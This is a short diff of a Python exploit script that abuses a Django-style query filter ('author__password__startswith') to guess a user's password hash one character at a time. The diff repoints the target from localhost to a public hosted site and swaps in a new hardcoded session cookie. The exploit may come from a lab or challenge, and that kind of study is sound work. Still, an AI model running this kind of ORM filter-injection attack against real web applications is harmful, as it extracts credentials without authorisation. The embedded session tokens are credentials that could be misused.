@@ -2,11 +2,11 @@ import requests
 import string
 import json
 import time
-LEAK_URL = "http://127.0.0.1:8000/?filter=author__password__startswith%3D"
-ALPHABET = "0123456789-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
-# COOKIE = "sessionid=bv2ep9kjdw1ia5kcyrl8joavumbfef3c"
-COOKIE = "sessionid=20n29l5y2t9odphu3a52spxx1h0q4ema"
+# LEAK_URL = "http://127.0.0.1:8000/?filter=author__password__startswith%3D"
+LEAK_URL = "https://yacinelrb.pythonanywhere.com/?filter=author__password__startswith%3D"
 
+ALPHABET = "0123456789-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+COOKIE = "sessionid=mybxsvft6cqsdn4ngez6d1vjsqwelyg9"
 
 def try_prefix(prefix):
 	full_url = LEAK_URL + prefix
